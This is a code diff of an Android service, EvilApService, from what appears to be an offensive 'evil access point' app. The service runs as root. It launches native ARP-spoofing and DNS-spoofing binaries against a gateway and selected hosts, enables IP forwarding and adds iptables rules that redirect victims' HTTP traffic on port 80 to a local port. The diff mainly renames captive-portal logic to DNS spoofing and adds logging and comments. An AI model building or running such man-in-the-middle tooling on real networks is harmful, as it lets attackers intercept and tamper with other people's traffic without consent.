@@ -26,15 +26,13 @@ class EvilApService: Service() {
     private val SCAN = "/lib/libscanner.so"
     private val DNSSPOOF = "/lib/libdnsspoof.so"
     enum class service(val action: String) {
-        ACTION_STOP_SERVICE("com.nibiru.evilap.service_stop"),
-        ACTION_SCAN_ACTIVE("com.nibiru.evilap.service_scan_active"),
-        ACTION_ARP_SPOOF_ON("com.nibiru.evilap.service_arp_spoof_start"),
-        ACTION_ARP_SPOOF_OFF("com.nibiru.evilap.service_arp_spoof_stop"),
-        ACTION_DNS_SNIFF("com.nibiru.evilap.service_dns_sniff"),
+        // button from notification has to use intent
+        // this is the intent action enum to stop service
+        // works same as sending exit event through event bus
+        ACTION_STOP_SERVICE("com.nibiru.evilap.service_stop")
     }
     private var mDispService: Disposable? = null
     private var mCheckedHosts: MutableList<Host> = ArrayList()
-    //private var mScannedHosts: MutableList<Host> = ArrayList()
     private var mShells: MutableList<Shell.Interactive> = ArrayList()
     private lateinit var myIp: String
     private lateinit var gateway: String
@@ -79,7 +77,7 @@ class EvilApService: Service() {
                     }
                 }
                 is EventArpSpoof -> { nativeArpSpoof(it.state) }
-                is EventHttpProxy -> { nativeHttpProxy(it.state) }
+                is EventHttpRedirect -> { nativeHttpProxy(it.state) }
                 is EventHostChecked -> {
                     if(it.checked) {
                         if(it.h !in mCheckedHosts)
@@ -90,7 +88,7 @@ class EvilApService: Service() {
                             mCheckedHosts.remove(it.h)
                     }
                 }
-                is EventCaptivePortal -> { nativeCaptivePortal(it.state) }
+                is EventDnsSpoof -> { nativeDnsSpoof(it.state) }
             }
         })
     }
@@ -138,6 +136,7 @@ class EvilApService: Service() {
     override fun onBind(intent: Intent?): IBinder = mBinder
 
     private fun exit(){
+        Log.d(TAG, "exit()")
         mWantsToStop = true
         if (mDispService!=null && !mDispService!!.isDisposed) mDispService!!.dispose()
         // notify other components
@@ -145,7 +144,7 @@ class EvilApService: Service() {
         val sh = getIdleShell() ?: return
         sh.addCommand(listOf("pkill -f ${applicationInfo.dataDir}/lib/"))
         nativeArpSpoof(false)
-        nativeCaptivePortal(false)
+        nativeDnsSpoof(false)
         for (shell in mShells)
             shell.close()
         stopSelf()
@@ -181,12 +180,14 @@ class EvilApService: Service() {
             }
             if(shell.isIdle) return shell
         }
-        return openRootShell()
+        val sh = openRootShell()
+        if(sh == null) Log.e(TAG, "Can't open root shell :(")
+        return sh
     }
 
     private fun nativeActiveScan(iface: String) {
-        val path = applicationInfo.dataDir
         val sh = getIdleShell() ?: return
+        val path = applicationInfo.dataDir
         sh.addCommand("ps | grep $path$SCAN", 0)
         { commandCode, exitCode, output ->
             if(exitCode==0) {
@@ -226,8 +227,15 @@ class EvilApService: Service() {
         }
     }
 
+    /**
+     * Starts or stops the native arpspoof binary along with any necessary setup.
+     * Sets up firewall rules and kernel parameters so that the OS networking stack will take care
+     * of forwarding any traffic without causing a Denial of Service.
+     * @param spoofing  start or stop spoofing activity
+     */
     private fun nativeArpSpoof(spoofing: Boolean){
         val path = applicationInfo.dataDir
+        val sh = getIdleShell() ?: return
         if(spoofing){
             val allIp = mCheckedHosts.map{ it.ip }
             if(myIp in allIp){
@@ -245,13 +253,13 @@ class EvilApService: Service() {
                     "sysctl -w net.ipv4.ip_forward=1",
                     "sysctl -w net.ipv6.conf.all.forwarding=1",
                     "sysctl -w net.ipv4.conf.all.send_redirects=0")
-            val sh = getIdleShell() ?: return
             sh.addCommand(cmds)
             for(host in mCheckedHosts) {
                 val cmd = "LD_LIBRARY_PATH=$path/lib/ $path$ARPSPOOF $gateway ${host.ip}"
                 sh.addCommand(cmd, 0, object : Shell.OnCommandLineListener {
                     override fun onCommandResult(commandCode: Int, exitCode: Int) {
-                        Log.i("[native]ARPSPOOF", "$cmd \n(exit code: $exitCode)")
+                        Log.d("[native]ARPSPOOF", "$cmd \n(exit code: $exitCode)")
+                        //TODO:exit code 7 - runtime error, cannot resolve hardware address
                     }
                     override fun onLine(line: String) {
                         Log.d("[native]ARPSPOOF", line)
@@ -260,49 +268,63 @@ class EvilApService: Service() {
             }
         }
         else{
-            Log.d(TAG, "killing ARPSPOOF")
+            Log.i(TAG, "killing ARPSPOOF")
             val cmds = listOf(
                     "pkill -f $path$ARPSPOOF",
                     "iptables -t filter -D FORWARD -i wlan0 -j ACCEPT",
                     "sysctl -w net.ipv4.ip_forward=0",
                     "sysctl -w net.ipv6.conf.all.forwarding=0",
                     "sysctl -w net.ipv4.conf.all.send_redirects=1")
-            val sh = getIdleShell() ?: return
             sh.addCommand(cmds)
         }
     }
 
+    /**
+     * Controls rules that redirect HTTP traffic to a local port.
+     * @param state Adds/removes iptables rules
+     */
     private fun nativeHttpProxy(state: Boolean) {
-        val cmds: List<String>
-        if(state)
-            cmds = listOf(
+        val sh = getIdleShell() ?: return
+        val cmds: List<String> = if(state)
+            listOf(
                     "iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337",
                     "ip6tables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337")
         else
-            cmds = listOf(
+            listOf(
                     "iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337",
                     "ip6tables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337")
-        val sh = getIdleShell() ?: return
+
         sh.addCommand(cmds)
     }
 
-    private fun nativeCaptivePortal(state: Boolean) {
-        // if myIp is not initialized then no scanning was done, so no iptables cleanup needed
+    /**
+     *
+     */
+    private fun nativeDnsSpoof(state: Boolean) {
+        // if myIp is not initialized then no scanning was done, and we don't know our IP yet
+        // TODO: find a better way
         if (!::myIp.isInitialized) return
-        if(state) {
-            val path = applicationInfo.dataDir
-            val cmds = listOf(
-                    "iptables -t nat -I PREROUTING -p tcp -d $myIp --dport 80 -j REDIRECT --to-port 8080",
-                    "LD_LIBRARY_PATH=$path/lib/ $path$DNSSPOOF wlan0")
-            val sh = getIdleShell() ?: return
-            sh.addCommand(cmds)
+        val sh = getIdleShell() ?: return
+        val path = applicationInfo.dataDir
+        val cmds = if(state) {
+            listOf(//"iptables -t nat -I PREROUTING -p tcp -d $myIp --dport 80 -j REDIRECT --to-port 8080",
+                    "LD_LIBRARY_PATH=$path/lib/ $path$DNSSPOOF wlan0"
+            )
         }
         else {
-            val cmds = listOf(
-                    "iptables -t nat -D PREROUTING -p tcp -d $myIp --dport 80 -j REDIRECT --to-port 8080")
-            val sh = getIdleShell() ?: return
-            sh.addCommand(cmds)
+            listOf("pkill -f $path$DNSSPOOF"
+                    //"iptables -t nat -D PREROUTING -p tcp -d $myIp --dport 80 -j REDIRECT --to-port 8080")
+            )
         }
+
+        sh.addCommand(cmds, 0, object : Shell.OnCommandLineListener {
+            override fun onCommandResult(commandCode: Int, exitCode: Int) {
+                Log.d("[native]DNSSPOOF", "$cmds \n(exit code: $exitCode)")
+            }
+            override fun onLine(line: String) {
+                Log.d("[native]DNSSPOOF", line)
+            }
+        })
     }
 
     private fun int2ip(int: Int): String{
@@ -318,8 +340,9 @@ class EvilApService: Service() {
     class EventExit
     data class EventActiveScan(val type: String)
     data class EventArpSpoof(val state: Boolean)
-    data class EventHttpProxy(val state: Boolean)
-    data class EventCaptivePortal(val state: Boolean)
+    data class EventHttpRedirect(val state: Boolean)
+    data class EventDnsSpoof(val state: Boolean)
+    data class EventDnsLog(val state: Boolean)
     data class EventHostChecked(val h: Host, val checked: Boolean)
     // Front end events
     data class EventScannedHosts(val host: Host?, val finnish: Boolean)
